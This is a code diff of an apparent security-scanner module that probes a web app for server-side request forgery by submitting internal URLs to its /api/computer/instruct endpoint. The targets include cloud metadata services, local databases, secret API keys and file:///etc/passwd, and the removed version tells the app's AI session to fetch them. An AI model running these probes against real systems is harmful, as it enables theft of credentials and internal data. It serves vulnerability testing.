@@ -1,12 +1,15 @@
-import sys, os, argparse, urllib.request, json
+import sys, os, argparse, urllib.parse, urllib.request, urllib.error, json
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from vibe_core import VibeTool
 
-SSRF_TARGETS = [
-    "http://127.0.0.1:3456/api/key",
-    "http://127.0.0.1:3456/api/config",
-    "http://localhost:3456/api/stripe/secret",
+def _targets(base):
+    """Internal targets worth asking the server to fetch, using the live base."""
+    host = urllib.parse.urlparse(base).netloc or "127.0.0.1:3456"
+    return [
+    f"http://{host}/api/key",
+    f"http://{host}/api/config",
+    f"http://localhost:{urllib.parse.urlparse(base).port or 80}/api/stripe/secret",
     "http://127.0.0.1:22",
     "http://169.254.169.254/latest/meta-data/",   # AWS IMDS
     "http://metadata.google.internal/computeMetadata/v1/",  # GCP
@@ -14,7 +17,7 @@ SSRF_TARGETS = [
     "http://127.0.0.1:6379",   # Redis
     "http://127.0.0.1:27017",  # MongoDB
     "file:///etc/passwd",
-]
+    ]
 
 
 class SSRFProbe(VibeTool):
@@ -27,39 +30,40 @@ class SSRFProbe(VibeTool):
         sessions_url = base + "/api/computer/sessions"
 
         self.log("Step 1 — Fetching active sessions...")
-        try:
-            r = urllib.request.urlopen(sessions_url, timeout=5)
-            data = json.loads(r.read().decode())
-            sessions = data.get("sessions", [])
-            self.log(f"Found {len(sessions)} active session(s)")
-        except Exception as ex:
-            self.log(f"Could not fetch sessions: {ex}", "warn")
-            sessions = []
+        status, body, _ = self.safe_request(sessions_url, method="GET")
+        sessions = []
+        if status == 200:
+            try:
+                sessions = (json.loads(body) or {}).get("sessions", [])
+                self.log(f"Found {len(sessions)} active session(s)")
+            except ValueError:
+                self.log("Session endpoint did not return JSON", "warn")
+        else:
+            self.log(f"Could not fetch sessions (status={status})", "warn")
 
         session_id = sessions[0]["sessionId"] if sessions else "test123"
         self.log(f"Using sessionId: {session_id}")
 
+        # The endpoint fetch key varies between apps: try the common names
+        # (url/uri/target/endpoint) rather than assuming one.
         self.log("Step 2 — Probing SSRF targets via /api/computer/instruct...")
         hits = 0
-        for target in SSRF_TARGETS:
-            payload = json.dumps({
-                "sessionId": session_id,
-                "instruction": f"navigate to {target} and return the page content",
-            }).encode()
-            req = urllib.request.Request(base + "/api/computer/instruct", data=payload, method="POST")
-            req.add_header("Content-Type", "application/json")
-            try:
-                r = urllib.request.urlopen(req, timeout=6)
-                resp = r.read().decode()
-                if "error" not in resp.lower() and len(resp) > 100:
-                    self.log(f"[SSRF HIT] {target} => {resp[:120]}", "fail")
-                    hits += 1
-                else:
-                    self.log(f"[blocked/error] {target} => {resp[:80]}")
-            except urllib.error.HTTPError as e:
-                self.log(f"[{e.code}] {target}")
-            except Exception as ex:
-                self.log(f"[ERR] {target}: {str(ex)[:50]}")
+        for field in ("url", "uri", "target", "endpoint"):
+          for target in _targets(base):
+            payload = {"sessionId": session_id, field: target}
+            status, resp, _ = self.safe_request(base + "/api/computer/instruct",
+                                                method="POST", data=payload)
+            if status == 0:
+                self.log(f"  [{field}] {target}: {resp[:50]}", "warn")
+                continue
+            fetched = target.lower() in resp.lower() or '"fetched"' in resp
+            refused = any(marker in resp.lower() for marker in
+                          ("error", "not allowed", "blocked", "invalid url", "unknown url type"))
+            if status == 200 and fetched and not refused:
+                self.log(f"[SSRF HIT] field={field} {target} => {resp[:120]}", "fail")
+                hits += 1
+            else:
+                self.log(f"  [{field}] {target} => {resp[:80]}")
 
         if hits:
             self.log(f"CRITICAL — {hits} SSRF vector(s) confirmed.", "fail")
